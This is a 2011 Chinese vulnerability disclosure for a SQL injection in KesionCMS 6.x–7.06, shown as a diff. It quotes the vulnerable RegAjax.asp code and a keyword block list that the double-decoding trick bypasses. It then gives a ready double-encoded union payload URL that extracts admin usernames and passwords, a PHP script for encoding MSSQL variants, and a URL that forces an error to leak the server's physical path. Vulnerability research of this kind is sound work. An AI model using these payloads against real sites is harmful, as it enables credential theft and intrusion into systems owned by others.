@@ -1,0 +1,103 @@
+科讯 6.x - 7.06 SQL 注射漏洞 
+
+漏洞详情
+
+披露状态：
+
+
+
+2011-07-27： 积极联系厂商并且等待厂商认领中，细节不对外公开
+2011-07-27： 厂商已经主动忽略漏洞，细节向公众公开
+
+
+简要描述：
+
+
+详细说明：
+
+Author:my5t3ry
+ 转载请注明：t00ls.net
+ 漏洞位于注册页面的\User\Reg\RegAjax.asp 中的24 - 46行 和 254 -270 行 代码如下：
+ 
+Class Ajax_Check
+        Private KS
+                Private Sub Class_Initialize()
+                  Set KS=New PublicCls
+                End Sub
+        Private Sub Class_Terminate()
+                 Set KS=Nothing
+                End Sub
+                Public Sub Kesion()
+                  
+                  Select Case KS.S("Action")
+                   Case "checkusername"
+                    Call CheckUserName()
+                   Case "checkemail"
+                    Call CheckEmail()
+                   Case "checkcode"
+                    Call CheckCode()
+                   Case "getregform"
+                    Call GetRegForm()
+                   Case "getcityoption"
+                    Call getCityOption()
+                  End Select
+                End Sub
+
+……略去无关代码
+
+                Sub getCityOption()
+                  Dim Province,XML,Node
+                  Province=UnEscape(KS.S("Province"))  //注意这里
+                  Dim RS:Set RS=Server.CreateObject("ADODB.RECORDSET")
+                  RS.Open "Select top 200 a.ID,a.City From KS_Province a Inner Join KS_Province b On A.ParentID=B.ID Where B.City='" & Province & "' order by a.orderid,a.id",conn,1,1
+                  If Not RS.Eof Then
+                    Set XML=KS.RsToXml(Rs,"row","")
+                  End If
+                  RS.Close : Set RS=Nothing
+                  If IsObject(XML) Then
+                   For Each Node In XML.DocumentElement.SelectNodes("row")
+                      KS.Echo "<option value=""" & node.SelectSingleNode("@city").text &""">" & node.SelectSingleNode("@city").text &"</option>"
+                   Next
+                  End If
+                  Set XML=Nothing
+                End Sub
+End Class
+
+ 以上代码中的Province=UnEscape(KS.S("Province")) 调用自定义函数KS.S进行过滤，接着又调用UnEscape函数解码！
+ 
+其中KS.S 函数 与UnEscape函数 原型如下:
+ 
+Function DelSql(Str)
+ Dim SplitSqlStr,SplitSqlArr,I
+ SplitSqlStr="dbcc|alter|drop|*|and |exec|or |insert|select|delete|update|count |master|truncate|declare|char|mid|chr|set |where|xp_cmdshell"
+ SplitSqlArr = Split(SplitSqlStr,"|")
+ For I=LBound(SplitSqlArr) To Ubound(SplitSqlArr)
+ If Instr(LCase(Str),SplitSqlArr(I))>0 Then
+ Die "<script>alert('系统警告！\n\n1、您提交的数据有恶意字符" & SplitSqlArr(I) &";\n2、您的数据已经被记录;\n3、您的IP："&GetIP&";\n4、操作日期："&Now&";\n Powered By Kesion.Com!');window.close();</script>"
+ End if
+ Next
+ DelSql = Str
+ End Function
+ '取得Request.Querystring 或 Request.Form 的值
+Public Function S(Str)
+ S = DelSql(Replace(Replace(Request(Str), "'", ""), """", ""))
+ End Function
+ 
+这里编码出现混乱，产生了与php的二次编码类似的漏洞，利用比较简单，可以union：
+ 
+http://localhost/user/reg/regajax.asp?action=getcityoption&province=%2527%2520%2575%256e%2569%256f%256e%2520%2553%2565%256c%2565%2563%2574%2520%2574%256f%2570%2520%2531%2530%2520%2541%2564%256d%2569%256e%2549%2544%252c%2555%2573%2565%2572%254e%2561%256d%2565%2526%2563%2568%2572%2528%2531%2532%2534%2529%2526%2550%2561%2573%2573%2557%256f%2572%2564%2520%2546%2572%256f%256d%2520%254b%2553%255f%2541%2564%256d%2569%256e%2500
+ 
+上面的利用针对ACCESS，MSSQL需要改下SQL语句：
+ 
+<?php
+ $str = "' union Select top 10 AdminID,UserName&chr(124)&PassWord From KS_Admin";
+ for ($i=0; $i<=strlen($str); $i++){
+ $temp .= "%25".base_convert(ord($str[$i]),10,16);
+ }
+ echo $temp."0";
+ ?>
+ 
+修改' union Select top 10 AdminID,UserName&chr(124)&PassWord From KS_Admin为相应的SQL语句即可。（MSSQL直接备份差异比较方便）
+ 
+因为解码的时候进行了CLng类型转换，提交字符可以使其报错从而爆出物理路径
+ 爆物理路径:http://localhost/user/reg/regajax.asp?action=getcityoption&province=%25i
